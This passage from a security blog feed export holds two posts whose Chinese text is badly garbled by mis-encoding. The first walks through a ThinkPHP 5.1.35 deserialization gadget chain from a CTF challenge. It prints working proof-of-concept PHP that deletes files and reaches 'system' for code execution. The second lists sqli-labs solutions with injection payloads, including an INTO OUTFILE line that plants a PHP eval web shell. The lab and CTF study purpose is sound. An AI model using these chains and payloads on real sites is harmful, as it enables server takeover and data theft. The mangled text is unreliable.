<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230303191949198.png" alt="image-20230303191949198"></p>
<p>è¿™è¿˜éœ€è¦åˆ©ç”¨åˆ°getNameå‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/232af69eba7c4ac497f476c9bbd72041.png" alt="img"></p>
<p>å‘ç°æ§åˆ¶çš„æ˜¯sessionä¸­çš„åä¸ºPHPSESSIDçš„å€¼ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥ä¸Šä¼ æ–‡ä»¶</p>
<h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><p>[GYCTF2020]EasyThinking</p>
<h3 id="tp5-1-35"><a href="#tp5-1-35" class="headerlink" title="tp5.1.35"></a>tp5.1.35</h3><p>åˆ›å»ºæ¼æ´ç‚¹</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305165911024.png" alt="image-20230305165911024"></p>
<p>èµ·ç‚¹ä¸º<code>/thinkphp/library/think/process/pipes/Windows.php</code>çš„<code>__destruct()</code></p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302145613227.png" alt="image-20230302145613227"></p>
<p>è¿™é‡Œè°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œå…ˆçœ‹removeFiles()å‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302145652860.png" alt="image-20230302145652860"></p>
<p>$filesæ˜¯å¯æ§çš„ï¼Œå¯ä»¥åˆ é™¤ä»»æ„è·¯å¾„çš„æ–‡ä»¶</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="string">&#x27;éœ€è¦åˆ é™¤æ–‡ä»¶çš„è·¯å¾„&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>

<p>åœ¨removeFiles()å‡½æ•°ä¸­ï¼Œfile_existå‡½æ•°ä¼šå°†$filenameå½“ä½œå­—ç¬¦ä¸²è¿”å›</p>
<p><code>__toString</code> å½“ä¸€ä¸ªå¯¹è±¡è¢«ååºåˆ—åŒ–ååˆè¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨æ—¶ä¼šè¢«è§¦å‘</p>
<p>è·Ÿè¿›<code>\thinkphp\library\think\model\concern\Conversion.php</code>ï¼Œæ‰¾åˆ°<code>__toString</code> æ–¹æ³•</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154027060.png" alt="image-20230302154027060"></p>
<p><code>__toString</code> æ–¹æ³•ä¸­è¿˜æœ‰ä¸€ä¸ªtoJsonæ–¹æ³•ï¼ŒæŸ¥çœ‹toJsonæ–¹æ³•</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154131074.png" alt="image-20230302154131074"></p>
<p>ç»§ç»­æŸ¥çœ‹toArrayæ–¹æ³•ï¼Œå…¶ä¸­é‡è¦çš„éƒ¨åˆ†æ˜¯</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302154530056.png" alt="image-20230302154530056"></p>
<p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ª<code>getRelation</code>æ–¹æ³•ï¼Œæ‰¾åˆ°<code>\thinkphp\library\think\model\concern\Attribute.php</code>ï¼Œç»§ç»­æŸ¥çœ‹<code>getRelation</code>æ–¹æ³•</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302160945021.png" alt="image-20230302160945021"></p>
<p>çœ‹toArrayæ–¹æ³•çš„é‡è¦éƒ¨åˆ†ï¼Œ<code>getRelation</code>æ–¹æ³•ä¸‹æœ‰ä¸€ä¸ª<code>if (!$relation)</code>ï¼Œæ‰€ä»¥ä¸ç”¨ç®¡<code>getRelation</code>æ–¹æ³•ï¼Œç›´æ¥è¿”å›ç©ºå°±å¯ä»¥ï¼Œç„¶åè°ƒç”¨äº†<code>getAttr</code>æ–¹æ³•</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302162010393.png" alt="image-20230302162010393"></p>
<p>é‡Œé¢æœ‰ä¸€ä¸ªgetDataæ–¹æ³•</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302162123772.png" alt="image-20230302162123772"></p>
<p>é€šè¿‡<code>getData</code>å‡½æ•°å¯ä»¥çŸ¥é“<code>$relation</code>çš„å€¼ä¸º<code>$this-&gt;data[$name]</code>ï¼Œè€Œä¸”è¿™é‡Œçš„ç±»å®šä¹‰ä½¿ç”¨çš„æ˜¯Traitè€Œä¸æ˜¯classï¼Œå› ä¸ºç”¨åˆ°äº†ä¸‰ä¸ªç±»ï¼Œéœ€è¦æ‰¾ä¸€ä¸ªç±»å…¶ä¸­ç»§æ‰¿äº†<code>Attribute</code>ç±»å’Œ<code>Conversion</code>ç±»</p>
<p>åœ¨<code>\thinkphp\library\think\Model.php</code>ä¸­æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªç±»</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302164807099.png" alt="image-20230302164807099"></p>
<p>åœ¨ç¼ºå°‘ä¸€ä¸ªè¿›è¡Œä»£ç æ‰§è¡Œçš„ç‚¹ï¼Œå¯»æ‰¾<code>__callæ–¹æ³•</code>ï¼Œ<code>__call</code>ä¸€èˆ¬ä¼šå­˜åœ¨<code>__call_user_func</code>å’Œ<code>__call_user_func_array</code>ï¼Œphpä»£ç æ‰§è¡Œçš„ç»ˆç‚¹ç»å¸¸é€‰æ‹©è¿™é‡Œ</p>
<p>åœ¨<code>/thinkphp/library/think/Request.php</code>ï¼Œæ‰¾åˆ°ä¸€ä¸ª<code>__call</code>å‡½æ•°ï¼Œ<code>__call</code> è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302170634963.png" alt="image-20230302170634963"></p>
<p>ä½†æ˜¯å› ä¸ºæŸäº›åŸå› ï¼Œè¿™ä¸ªæ–¹æ³•å¹¶ä¸èƒ½ä½¿ç”¨</p>
<p>ä½†æ˜¯åœ¨Thinkphpçš„Requestç±»ä¸­è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½filteråŠŸèƒ½ï¼Œå¯ä»¥å°è¯•è¦†ç›–<code>filter</code>çš„æ–¹æ³•å»æ‰§è¡Œä»£ç </p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302173603880.png" alt="image-20230302173603880"></p>
<p>ä½†æ˜¯è¿™é‡Œçš„$valueä¸å¯æ§ï¼Œéœ€è¦æ‰¾åˆ°å¯ä»¥æ§åˆ¶$valueçš„ç‚¹ï¼Œæ‰¾åˆ°inputå‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205209904.png" alt="image-20230302205209904"></p>
<p>ä½†æ˜¯inputå‡½æ•°ä¸­çš„å‚æ•°ä¸å¯æ§ï¼Œè¿˜å¾—ç»§ç»­æ‰¾åˆ°å¯æ§ç‚¹ï¼Œæ‰€ä»¥æ‰¾åˆ°äº†paramå‡½æ•°ï¼Œé‡è¦éƒ¨åˆ†</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302175226720.png" alt="image-20230302175226720"></p>
<p>ä½†æ˜¯è¿˜æ˜¯ä¸å¯æ§ï¼Œç»§ç»­æ‰¾å¯ä»¥è°ƒç”¨paramå‡½æ•°çš„åœ°æ–¹ï¼Œæ‰¾åˆ°äº†isAjaxå‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302174824834.png" alt="image-20230302174824834"></p>
<p>åœ¨<code>isAjax</code>å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>$this-&gt;config[&#39;var_ajax&#39;]</code>ï¼Œä¹Ÿå°±æ„å‘³ç€paramå‡½æ•°ä¸­çš„$nameå¯æ§ï¼Œparamå‡½æ•°ä¸­çš„$nameå¯æ§ä¹Ÿå°±æ„å‘³ç€inputå‡½æ•°ä¸­çš„$nameå¯æ§</p>
<p>inputå‡½æ•°ä¸­æœ‰</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205324936.png" alt="image-20230302205324936"></p>
<p>å¯ä»¥æ§åˆ¶çš„æ˜¯nameå‚æ•°ï¼ŒæŸ¥çœ‹getDataå‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205401346.png" alt="image-20230302205401346"></p>
<p>è¿™æ ·$dataå°±å¯æ§ï¼Œå°±æƒ³å½“äºå¯ä»¥æ§åˆ¶$dataï¼Œå†è·Ÿè¿›getFilterå‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302205554731.png" alt="image-20230302205554731"></p>
<p>inputå‡½æ•°ä¸­æœ‰</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210600148.png" alt="image-20230302210600148"></p>
<p>å› ä¸ºgetFilterä¼šç›´æ¥è¿”å›$filterï¼Œæ‰€ä»¥$filterå°±ç­‰äº$this-&gt;filterï¼Œéœ€è¦å®šä¹‰<code>$this-&gt;filter</code>ä¸ºå‡½æ•°å</p>
<p>è¿™æ ·call_user_funcå‡½æ•°çš„å›è°ƒå‡½æ•°å¯æ§ï¼Œåªå‰©ä¸‹å›è°ƒå‡½æ•°çš„å‚æ•°</p>
<p>å†çœ‹inputå‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210753895.png" alt="image-20230302210753895"></p>
<p>è¿™é‡Œå¯ä»¥è¿›è¡Œå›è°ƒï¼Œè·Ÿè¿›filterValueå‡½æ•°</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230302210851115.png" alt="image-20230302210851115"></p>
<p>åˆ†æå‘ç°ï¼Œåœ¨inputå‡½æ•°ä¸­</p>
<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305114544744.png" alt="image-20230305114544744"></p>
<p>å¦‚æœ<code>$data</code>ä¸å¯æ§ï¼Œå¦‚æœ<code>$data</code>å¯æ§ï¼Œè€Œä¸”<code>$name</code>ä¸ºç©ºå­—ç¬¦ä¸²çš„è¯ï¼Œinputå‡½æ•°ä¸­å‰é¢çš„é‚£äº›ä»£ç ifæ¡ä»¶å°±ä¸æˆç«‹ï¼Œä¸æ„æˆå½±å“ï¼Œ<code>$data</code>ä¹Ÿå°±æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</p>
<p>æœ€ç»ˆï¼Œ$dataå’Œ$filteréƒ½å¯æ§ï¼Œ<code>$value = call_user_func($filter, $value);</code>è¿™æ ·è¿™ä¸ªå°±å¯ä»¥ä½¿ç”¨</p>
<p>æœ€ç»ˆpoc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()</span><br><span class="line">            );</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// è¡¨å•pjaxä¼ªè£…å˜é‡</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// å…¼å®¹PATH_INFOè·å–</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPSä»£ç†æ ‡è¯†</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IPä»£ç†è·å–æ ‡è¯†</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URLä¼ªé™æ€åç¼€</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="variable language_">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/06/tp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230305165150060.png" alt="image-20230305165150060"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labså…³å¡</title>
    <url>/2022/11/19/sqli-labs/</url>
    <content><![CDATA[<p>ç®€ä»‹</p>
<span id="more"></span>

<p>æ•°æ®åº“ï¼šsecurity<br>è¡¨ï¼šemails,referers,uagents,users<br>åˆ—ï¼šUSER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
<h3 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h3><p>å­—ç¬¦å‹ id&#x3D;â€™â€™</p>
<h3 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h3><p>æ•°å­—å‹ id&#x3D;</p>
<h3 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h3><p>å¸¦æ‹¬å·çš„å­—ç¬¦å‹ id&#x3D;(â€˜â€™)</p>
<h3 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h3><p>å¸¦æ‹¬å·çš„å­—ç¬¦å‹ id&#x3D;(â€œâ€)</p>
<h3 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h3><p>å­—ç¬¦å‹ id&#x3D;â€™â€™<br>éœ€è¦ä½¿ç”¨å¸ƒå°”ç›²æ³¨ å•å¼•å·</p>
<h3 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h3><p>å­—ç¬¦å‹ id&#x3D;â€™â€™<br>ä½¿ç”¨å¸ƒå°”ç›²æ³¨ åŒå¼•å·</p>
<h3 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h3><p><a href="http://localhost/sqli-labs-master/Less-7/?id=1&#39;">http://localhost/sqli-labs-master/Less-7/?id=1&#39;</a>)) union select 1,2,â€<?php @eval($_POST['pass']);?>â€œ into outfile â€œE:\phpstudy\phpstudy_pro\WWW\sqli-labs-master\Less-7\pass.phpâ€â€“+<br>ä½¿ç”¨æ–‡ä»¶ä¸Šä¼ </p>
<h3 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h3><p>å­—ç¬¦å‹  id&#x3D;â€™â€™<br>ä½¿ç”¨å¸ƒå°”ç›²æ³¨</p>
<h3 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h3><p>æ—¶é—´å»¶è¿Ÿ  å•å¼•å·</p>
<h3 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h3><p>æ—¶é—´å»¶è¿Ÿ  åŒå¼•å·</p>
<h3 id="ç¬¬åä¸€å…³"><a href="#ç¬¬åä¸€å…³" class="headerlink" title="ç¬¬åä¸€å…³"></a>ç¬¬åä¸€å…³</h3><p>postæ³¨å…¥ å­—ç¬¦å‹<br>id&#x3D;â€™â€™</p>
<h3 id="ç¬¬åäºŒå…³"><a href="#ç¬¬åäºŒå…³" class="headerlink" title="ç¬¬åäºŒå…³"></a>ç¬¬åäºŒå…³</h3><p>postæ³¨å…¥<br>id&#x3D;(â€œâ€)<br>uname&#x3D;&amp;passwd&#x3D;1â€) union select 1,2#&amp;submit&#x3D;Submit</p>
<h3 id="ç¬¬åä¸‰å…³"><a href="#ç¬¬åä¸‰å…³" class="headerlink" title="ç¬¬åä¸‰å…³"></a>ç¬¬åä¸‰å…³</h3><p>postçš„æŠ¥é”™å‹æ³¨å…¥<br>ä½¿ç”¨â€™)</p>
<h3 id="ç¬¬åå››å…³"><a href="#ç¬¬åå››å…³" class="headerlink" title="ç¬¬åå››å…³"></a>ç¬¬åå››å…³</h3><p>postçš„æŠ¥é”™å‹æ³¨å…¥<br>å’Œåä¸‰å…³ç›¸ä¼¼<br>ä½¿ç”¨â€</p>
<h3 id="ç¬¬åäº”å…³"><a href="#ç¬¬åäº”å…³" class="headerlink" title="ç¬¬åäº”å…³"></a>ç¬¬åäº”å…³</h3><p>postçš„æ—¶é—´å»¶è¿Ÿæ³¨å…¥<br>ä½¿ç”¨â€™</p>
<h3 id="ç¬¬åå…­å…³"><a href="#ç¬¬åå…­å…³" class="headerlink" title="ç¬¬åå…­å…³"></a>ç¬¬åå…­å…³</h3><p>postçš„æ—¶é—´å»¶è¿Ÿæ³¨å…¥<br>ä½¿ç”¨â€ï¼‰</p>
<h3 id="ç¬¬åä¸ƒå…³"><a href="#ç¬¬åä¸ƒå…³" class="headerlink" title="ç¬¬åä¸ƒå…³"></a>ç¬¬åä¸ƒå…³</h3><p>usernameè¿›è¡Œäº†è¿‡æ»¤  å¯ä»¥åœ¨passwordè¿›è¡Œæ³¨å…¥<br>å…ˆè¾“å…¥å¯¹çš„username<br>å†è¿›è¡ŒæŠ¥é”™å‹æ³¨å…¥<br>ä½¿ç”¨â€™<br>â€˜and extractvalue(1,concat(0x7e,(select database()))) andâ€™1â€™&#x3D;â€™1</p>
<h3 id="ç¬¬åå…«å…³"><a href="#ç¬¬åå…«å…³" class="headerlink" title="ç¬¬åå…«å…³"></a>ç¬¬åå…«å…³</h3><p>éœ€è¦ç™»å½•æ­£ç¡®çš„usernameå’Œpassword<br>usernameå’Œpasswordéƒ½å­˜åœ¨è¿‡æ»¤<br>å»User-Agentè¿›è¡Œæ³¨å…¥ï¼Œå…ˆå°†valuesè¿›è¡Œé—­åˆ<br>ä½¿ç”¨æŠ¥é”™å‹æ³¨å…¥<br>User-Agent: 1â€™,1,updatexml(1,concat(0x5e,database()),1))#<br>æˆ–è€…<br>User-Agent: â€˜and extractvalue(1,concat(0x7e,(select database()))) andâ€™1â€™&#x3D;â€™1</p>
<h3 id="ç¬¬åä¹å…³"><a href="#ç¬¬åä¹å…³" class="headerlink" title="ç¬¬åä¹å…³"></a>ç¬¬åä¹å…³</h3><p>éœ€è¦ç™»å½•æ­£ç¡®çš„usernameå’Œpassword<br>å»Refererè¿›è¡Œæ³¨å…¥ï¼Œå…ˆå°†valuesè¿›è¡Œé—­åˆ<br>ä½¿ç”¨æŠ¥é”™å‹æ³¨å…¥<br>Referer: 1â€™,updatexml(1,concat(0x5e,database()),1))#</p>
<h3 id="ç¬¬äºŒåå…³"><a href="#ç¬¬äºŒåå…³" class="headerlink" title="ç¬¬äºŒåå…³"></a>ç¬¬äºŒåå…³</h3><p>éœ€è¦ç™»å½•æ­£ç¡®çš„usernameå’Œpassword<br>å»cookieè¿›è¡Œæ³¨å…¥<br>ä½¿ç”¨è”åˆæ³¨å…¥<br>Cookie: uname&#x3D;â€™ union select 1,2,database()#</p>
<h3 id="ç¬¬äºŒåä¸€å…³"><a href="#ç¬¬äºŒåä¸€å…³" class="headerlink" title="ç¬¬äºŒåä¸€å…³"></a>ç¬¬äºŒåä¸€å…³</h3><p>éœ€è¦ç™»å½•æ­£ç¡®çš„usernameå’Œpassword<br>å»cookieè¿›è¡Œæ³¨å…¥<br>ä½¿ç”¨è”åˆæ³¨å…¥<br>ä½†è¿™é‡Œæœ‰base64ç¼–ç <br>åŸæ³¨å…¥è¯­å¥ä¸ºâ€™) union select 1,group_concat(schema_name),3 from information_schema.schemata #<br>éœ€è¦è¿›è¡Œç¼–ç ä¸ºJykgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhICM&#x3D;<br>Cookie: uname&#x3D;â€™) union select 1,group_concat(schema_name),3 from information_schema.schemata #</p>
<h3 id="ç¬¬äºŒåäºŒå…³"><a href="#ç¬¬äºŒåäºŒå…³" class="headerlink" title="ç¬¬äºŒåäºŒå…³"></a>ç¬¬äºŒåäºŒå…³</h3><p>éœ€è¦ç™»å½•æ­£ç¡®çš„usernameå’Œpassword<br>å»cookieè¿›è¡Œæ³¨å…¥<br>ä½¿ç”¨è”åˆæ³¨å…¥<br>ä½†è¿™é‡Œæœ‰base64ç¼–ç <br>åŸæ³¨å…¥è¯­å¥ä¸ºâ€ union select 1,group_concat(schema_name),3 from information_schema.schemata #<br>éœ€è¦è¿›è¡Œç¼–ç ï¼Œå’Œç¬¬äºŒåä¸€å…³å·®ä¸å¤š</p>
